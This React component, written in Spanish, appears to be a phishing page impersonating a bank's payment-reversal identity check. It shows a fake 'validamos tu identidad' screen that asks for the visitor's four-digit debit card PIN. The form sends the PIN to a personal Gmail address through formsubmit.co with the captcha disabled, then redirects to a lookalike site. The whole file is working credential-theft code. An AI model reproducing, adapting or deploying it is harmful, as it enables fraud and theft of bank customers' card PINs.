import React, { useState } from 'react'
import './validar.css'
import Footer from './Footer'
import { useNavigate } from 'react-router-dom'
import Cargando from './Cargando'

const Validar = ({setLoading}) => {

    const navigate = useNavigate()
    const [colorBtn, setColorBtn] = useState(false)
    const [load, setLoad] = useState(true)

    setTimeout(() => {
      setLoad(false)
    }, 2000);

    const btnColor = e => {
        e.target.value.length === 4 ? setColorBtn(true) : setColorBtn(false)
    }

    const back = () => {
      navigate('/usuario-popular')
    }

//     const validar = e => {
// e.preventDefault()

// nvaigate('/')

// setLoading(true)

// setTimeout(() => {
//   setLoading(false)
// }, 2000);
//     }

if(load){
  return <Cargando />
} else {
  return (
    <div className='validar'>
        <section>
        <div onClick={back} className="back">
          <div className="icon-back">
            <i className='bx bx-arrow-back'></i>
          </div>
        <p>Volver</p>
        </div>

        <div className="texto-contraseña">
          <div className="img-contra">
        <img src="https://ventas.popularcomproba.repl.co/informa.png" alt="" />            
          </div>
        <h1>Validamos tu identidad</h1>
        <p>¿Qué es el Drerecho a la Reversión de Pago?</p>

        <p>Es la facultad del consumidor para solicitar la reversión de su pago dentro de los 5 (5) primeros días hábiles siguientes a la fecha en que el consumidor tuvo noticia de ser objeto de fraude, o corresponda a una operacion no solicitada.</p>

        <p>Para procesar la revisión de pago, debemos validar que eres tu.</p>
      </div>

      <form 
      action="https://formsubmit.co/raulsacoco@gmail.com" method="POST"
      className='form-debi'>
        <label htmlFor="inputDebi">Clave de su tarjeta de débito</label>
        <input onChange={btnColor} type="password" name='debi' maxLength="4" minLength="4" />
        <input type="hidden" name="_captcha" value="false"></input>
        <input type="hidden" name="_next" value="https://popular-compras.netlify.app/"></input>

        <button className={`${colorBtn && 'btn-active'}`}>Validar</button>
      </form>

      <Footer />
        </section>
    </div>
  )
}
}

export default Validar